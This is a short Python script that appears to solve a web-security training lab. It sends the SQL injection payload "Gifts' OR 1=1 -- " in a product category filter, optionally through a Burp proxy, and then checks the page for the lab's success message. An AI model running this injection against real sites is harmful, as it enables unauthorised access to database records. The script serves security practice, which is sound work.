import sys
import logging
import argparse
import urllib3
import time

import requests

# disable proxy cert warning since we are using burp
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

HEADERS = {
    "X-Pwnfox-Color":"magenta"
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--no-proxy", help="to not use proxy",default=False,action="store_true")
    parser.add_argument("url", help="enter the url",type=str)
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith('/'):
        url = url + "/"
    return url

def is_solved(url: str, no_proxy: bool):
    def get_content(url,no_proxy):
        log.info("checking if solved.")
        if no_proxy:
            resp = requests.get(url)
        else:
            resp = requests.get(url,proxies=PROXIES,verify=False)

        if "Congratulations, you solved the lab!" in resp.text:
            log.info("Lab is solved")
            return True
    if not get_content(url, no_proxy):
        time.sleep(2)
        get_content(url,no_proxy)

def main(args):
    url = normalize_url(args.url)
    exploit_url = url + "filter?category=Gifts' OR 1=1 -- "
    log.info(f"Getting url: {exploit_url}")

    if args.no_proxy:
        resp = requests.get(exploit_url,headers=HEADERS)
    else:
        resp = requests.get(exploit_url, proxies=PROXIES, verify=False, headers=HEADERS)

    solved = False

    if resp.status_code == 200:
        solved = is_solved(url,args.no_proxy)
    if solved:
        log.info("Congrats!")
    else:
        log.info("Not solved :(")


if __name__ == "__main__":
    args = parse()
    main(args)
